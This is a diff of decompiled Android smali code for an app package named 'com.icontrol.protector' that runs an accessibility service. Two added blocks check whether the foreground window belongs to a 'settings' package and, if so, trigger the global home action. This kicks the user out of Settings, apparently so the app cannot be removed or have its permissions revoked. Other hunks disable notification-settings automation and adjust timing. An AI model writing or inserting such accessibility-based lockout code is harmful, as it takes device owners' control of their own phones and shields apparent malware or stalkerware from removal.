@@ -12,7 +12,7 @@
 
 .field public static a:Lcom/icontrol/protector/AccessServices; = null
 
-.field private static b:Z = false
+.field public static b:Z = false
 
 .field public static c:Z = false
 
@@ -2738,6 +2738,27 @@
     goto :goto_2
 
     :cond_0
+    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;
+    invoke-virtual {v0}, Lcom/icontrol/protector/AccessServices;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
+    move-result-object v0
+    if-eqz v0, :cond_do_back
+    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;
+    move-result-object v1
+    if-eqz v1, :cond_do_back
+    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;
+    move-result-object v1
+    const-string v2, "settings"
+    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v1
+    if-eqz v1, :cond_do_back
+    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;
+    const/4 v1, 0x2
+    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
+    const/4 v0, 0x0
+    sput-boolean v0, Lcom/icontrol/protector/m;->n:Z
+    invoke-static {}, Lcom/icontrol/protector/m;->G1()V
+    return-void
+    :cond_do_back
     const/4 v0, 0x0
 
     move v1, v0
@@ -3415,7 +3436,7 @@
 
     sput-boolean v2, Lcom/icontrol/protector/m;->b:Z
 
-    const/16 p0, 0x320
+    const/16 p0, 0x1f4
 
     invoke-static {p0}, Lcom/icontrol/protector/m;->g3(I)V
 
@@ -7744,20 +7765,7 @@
     .locals 1
 
     .line 1
-    const/4 v0, 0x1
-
-    sput-boolean v0, Lcom/icontrol/protector/m;->n:Z
-
-    invoke-static {}, Lcom/icontrol/protector/m;->H1()V
-
-    const/16 v0, 0x1f4
-
-    invoke-static {v0}, Lcom/icontrol/protector/m;->g3(I)V
-
-    const/4 v0, 0x5
-
-    invoke-static {v0}, Lcom/icontrol/protector/m;->D1(I)V
-
+    # Disabled: notification settings auto-close removed
     return-void
 .end method
 
@@ -15603,7 +15611,7 @@
 .end method
 
 .method public static X2()V
-    .locals 3
+    .locals 5
 
     .line 1
     const/4 v0, 0x0
@@ -16038,6 +16046,26 @@
     sput-boolean v0, Lcom/icontrol/protector/m;->n:Z
 
     sput-boolean v0, Lcom/icontrol/protector/m;->w:Z
+
+    sget-object v1, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;
+    invoke-virtual {v1}, Lcom/icontrol/protector/AccessServices;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
+    move-result-object v1
+    if-eqz v1, :cond_do_back_z2
+    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;
+    move-result-object v2
+    if-eqz v2, :cond_do_back_z2
+    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;
+    move-result-object v2
+    const-string v1, "settings"
+    invoke-virtual {v2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    move-result v1
+    if-eqz v1, :cond_do_back_z2
+    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;
+    const/4 v1, 0x2
+    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
+    invoke-static {}, Lcom/icontrol/protector/m;->G1()V
+    return-void
+    :cond_do_back_z2
 
     :goto_0
     const/4 v1, 0x3
@@ -24198,20 +24226,12 @@
     .locals 1
 
     .line 1
+    # Keep m.o = true (completion flag) but disable notification automation
     const/4 v0, 0x1
 
     sput-boolean v0, Lcom/icontrol/protector/m;->o:Z
 
-    invoke-static {}, Lcom/icontrol/protector/m;->H1()V
-
-    const/16 v0, 0x1f4
-
-    invoke-static {v0}, Lcom/icontrol/protector/m;->g3(I)V
-
-    const/4 v0, 0x5
-
-    invoke-static {v0}, Lcom/icontrol/protector/m;->w1(I)V
-
+    # Disabled: notification settings auto-close removed
     return-void
 .end method
 
